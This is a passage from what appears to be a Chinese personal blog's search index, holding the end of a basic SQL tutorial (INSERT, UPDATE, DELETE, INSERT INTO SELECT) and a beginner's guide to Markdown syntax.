keyword">VALUES</span> <span class="token punctuation">(</span>value1<span class="token punctuation">,</span>value2<span class="token punctuation">,</span>value3<span class="token punctuation">,</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>格式2：指定列名及被插入的值：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> table_name <span class="token punctuation">(</span>column1<span class="token punctuation">,</span>column2<span class="token punctuation">,</span>column3<span class="token punctuation">,</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token keyword">VALUES</span> <span class="token punctuation">(</span>value1<span class="token punctuation">,</span>value2<span class="token punctuation">,</span>value3<span class="token punctuation">,</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>column为table_name表中的字段；</li></ul><p><img src="/2023/04/03/sql/13.png" alt="13"></p><h4 id="更新：UPDATE语句"><a href="#更新：UPDATE语句" class="headerlink" title="更新：UPDATE语句"></a>更新：UPDATE语句</h4><p>UPDATE：用于更新表中<strong>已存在</strong>的记录。</p><p>格式：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">UPDATE</span> table_name<span class="token keyword">SET</span> column1 <span class="token operator">=</span> value1<span class="token punctuation">,</span> column2 <span class="token operator">=</span> value2<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token keyword">WHERE</span> condition<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>able_name：要修改的表名称；</li><li>column1, column2, …：要修改的字段名称，可以为多个字段；</li><li>value1, value2, …：要修改的值，可以为多个值；</li><li>condition：修改条件，用于指定哪些数据要修改。</li></ul><p><img src="/2023/04/03/sql/14.png" alt="14"></p><p><strong>Note：</strong>update更新数据时，切记不要忘记带where子句，否则你的表中的相应字段的值都会被修改。</p><h4 id="删除：DELETE语句"><a href="#删除：DELETE语句" class="headerlink" title="删除：DELETE语句"></a>删除：DELETE语句</h4><p>DELETE：用于删除表中的行。</p><p>格式：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">DELETE</span> <span class="token keyword">FROM</span> table_name<span class="token keyword">WHERE</span> condition<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li><p>table_name：要删除的表名称;</p></li><li><p>condition：删除条件，用于指定哪些数据要删除。</p></li></ul><p><img src="/2023/04/03/sql/15.png" alt="15"></p><p><strong>Note：</strong></p><ul><li>delete删除数据时，切记不要忘记带where子句，否则你表中的所有记录都会被修改。</li><li>可以在不删除表的情况下，删除表中所有的行。这意味着表结构、属性、索引将保持不变：DELETE FROM <em>table_name</em>;</li></ul><h4 id="复制：INSERT-INTO-SELECT"><a href="#复制：INSERT-INTO-SELECT" class="headerlink" title="复制：INSERT INTO SELECT"></a>复制：INSERT INTO SELECT</h4><p>INSERT INTO SELECT 语句从一个表复制数据，然后把数据插入到一个<strong>已存在的表中</strong>。目标表中任何已存在的行都不会受影响。</p><p>格式：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> table2<span class="token punctuation">[</span><span class="token punctuation">(</span>column_name<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token keyword">SELECT</span> <span class="token operator">*</span><span class="token punctuation">[</span>columns_name<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token keyword">FROM</span> table1<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2023/04/03/sql/20.png" alt="20"></p><h3 id="视图-待写"><a href="#视图-待写" class="headerlink" title="视图(待写)"></a>视图(待写)</h3><h3 id="SQL函数-待写"><a href="#SQL函数-待写" class="headerlink" title="SQL函数(待写)"></a>SQL函数(待写)</h3>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>My First Blog</title>
      <link href="/2023/04/02/start-blog/"/>
      <url>/2023/04/02/start-blog/</url>
      
        <content type="html"><![CDATA[<h1 id="Markdown-标题"><a href="#Markdown-标题" class="headerlink" title="Markdown 标题"></a>Markdown 标题</h1><p>“#”   =&gt; 一级标题<br>“##” =&gt; 二级标题，以此类推，一共六级标题。</p><h1 id="Markdown文本"><a href="#Markdown文本" class="headerlink" title="Markdown文本"></a>Markdown文本</h1><ul><li>斜体：可以在需要标注为斜体文本前及斜体文本结尾，输入一个星号<code>*</code>或者一个下划线 <code>_</code>；<br>eg：<code>*斜体*</code> ⇒ <em>斜体</em>   <code>_斜体_</code>⇒ <em>斜体</em></li><li>粗体：<code>**</code>或者<code>__</code></li><li>斜粗体：<code>***</code>或者<code>___</code></li></ul><h1 id="Markdown列表"><a href="#Markdown列表" class="headerlink" title="Markdown列表"></a>Markdown列表</h1><p>1）无序列表：使用星号(<code>*</code>)、加号(<code>+</code>)或是减号(<code>-</code>)，再加一个空格作为列表标记；<br>2）有序列表：使用数字并加上 <code>.</code> 号，再加一个空格作为列表标记；<br>note：如果要控制列表的层级，则需要在符号 前使用 <code>tab</code>，如下：</p><ul><li>无序列表 1</li><li>无序列表 2<ul><li>无序列表 2.1</li><li>无序列表 2.2</li></ul></li></ul><h1 id="Markdown链接"><a href="#Markdown链接" class="headerlink" title="Markdown链接"></a>Markdown链接</h1><p>格式：<code>[链接名称](链接地址)</code>或者&lt;链接地址&gt;<br>eg:<a href="https://blog.csdn.net/qq_61670993?spm=1018.2226.3001.5343">XiaozaYa</a>或者<a href="https://blog.csdn.net/qq_61670993?spm=1018.2226.3001.5343">https://blog.csdn.net/qq_61670993?spm=1018.2226.3001.5343</a></p><h1 id="Markdown引用"><a href="#Markdown引用" class="headerlink" title="Markdown引用"></a>Markdown引用</h1><p>格式：在符号 <code>&gt;</code> 后面书写文字，或者加一个空格再加文字；<br>eg：</p><blockquote><p>hello:<br>Welcome</p></blockquote><p>除正常引用外，还可以嵌套，一个 <code>&gt;</code> 符号在第一层，两个 <code>&gt;</code> 符号是第二层，以此类推，如下：</p><blockquote><p>这是一个引用:</p><blockquote><p>welcome</p><blockquote><p>快来玩啊！</p></blockquote></blockquote></blockquote><h1 id="Markdown分割线"><a href="#Markdown分割线" class="headerlink" title="Markdown分割线"></a>Markdown分割线</h1><h2 id="格式：在一行中用三个-或者-来建立一个分隔线，同时需要在分隔线的上面空一行；如果不留空格，当用-时就会变成放大上面的字；eg-Welcome-我爱你！"><a href="#格式：在一行中用三个-或者-来建立一个分隔线，同时需要在分隔线的上面空一行；如果不留空格，当用-时就会变成放大上面的字；eg-Welcome-我爱你！" class="headerlink" title="格式：在一行中用三个 - 或者 * 来建立一个分隔线，同时需要在分隔线的上面空一行；如果不留空格，当用-时就会变成放大上面的字；eg:Welcome!***我爱你！"></a>格式：在一行中用三个 <code>-</code> 或者 <code>*</code> 来建立一个分隔线，同时需要在分隔线的上面空一行；如果不留空格，当用<code>-</code>时就会变成放大上面的字；<br>eg:<br>Welcome!<br>***<br>我爱你！</h2><hr><hr><h1 id="Markdown删除线"><a href="#Markdown删除线" class="headerlink" title="Markdown删除线"></a>Markdown删除线</h1><p>格式：在需要删除的文字前后各使用两个 <code>~</code>；<br>eg：<br><del>删除线</del></p><h1 id="Markdown下划线"><a href="#Markdown下划线" class="headerlink" title="Markdown下划线"></a>Markdown下划线</h1><p>格式：在需要添加下划线的文字首部和尾部加上 <code>&lt;u&gt;文本&lt;/u&gt;</code>；<br>eg：<br><u>下划线</u></p><h1 id="Markdown表格"><a href="#Markdown表格" class="headerlink" title="Markdown表格"></a>Markdown表格</h1><p>格式：表格使用 <code>|</code> 来分隔不同的单元格，使用 <code>-</code> 来分隔表头和其他行，如果想调整表格的左对齐、右对齐、居中对齐:</p><ul><li><code>:-</code>：将表头及单元格的内容左对齐；</li><li><code>-:</code>：将表头及单元格的内容左对齐；</li><li><code>:-:</code>：将表头及单元格的内容居中对齐；<br>eg：<br>|姓名|年龄|工作|<br>| :—– | :–: | ——-:|<br>| 小可爱 |  18  | 吃可爱多  |<br>| 小小勇敢 |  20  | 爬棵勇敢树  |<br>| 小小小机智 |  22  | 看一本机智书 |</li></ul><p>|姓名|年龄|工作|<br>| :—– | :–: | ——-:|<br>| 小可爱 |  18  | 吃可爱多  |<br>| 小小勇敢 |  20  | 爬棵勇敢树  |<br>| 小小小机智 |  22  | 看一本机智书 |</p><h1 id="Markdown图片"><a href="#Markdown图片" class="headerlink" title="Markdown图片"></a>Markdown图片</h1><p>格式：<code>![图片描述](图片地址)</code><br>note：</p><ul><li>如果是行内图片则无图例，否则有图例；</li><li>仅支持 https 的图片，图片粘贴到网页编辑器后，会自动上传到服务器；如果是本地编辑器，需要有一个相对路径用来存储保存的图片。</li><li>支持 <code>jpg、png、gif、svg</code> 等图片格式，<strong>其中 svg 文件仅可在微信公众平台中使用</strong>。<br><img src="http://image.luokangyuan.com/4027734.jpeg" alt="图片:【heihei】"></li></ul><h1 id="Markdown脚注"><a href="#Markdown脚注" class="headerlink" title="Markdown脚注"></a>Markdown脚注</h1><p>格式：<code>[文字](脚注解释 "脚注名字")</code><br>eg：<br>脚注：<a href="%E8%84%9A%E6%B3%A8%E8%A7%A3%E9%87%8A" title="脚注名字">文字</a></p><h1 id="Markdown代码块"><a href="#Markdown代码块" class="headerlink" title="Markdown代码块"></a>Markdown代码块</h1><p>格式：如果在一个行内需要引用代码，只要用反引号引起来就好；<br>eg：Use the <code>printf()</code> function.</p><ul><li>如果是在一个块内需要引用代码，则在需要高亮的代码块的前一行及后一行使用三个反引号，同时 <strong>第一行反引号后面表示代码块所使用的语言</strong>，如下：<pre class="line-numbers language-none"><code class="language-none">#include&lt;stdio.h&gt;int main(){printf("Hello World\n");return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul>]]></content>
      
      
      <categories>
          
          <category> Markdown </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Markdown </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
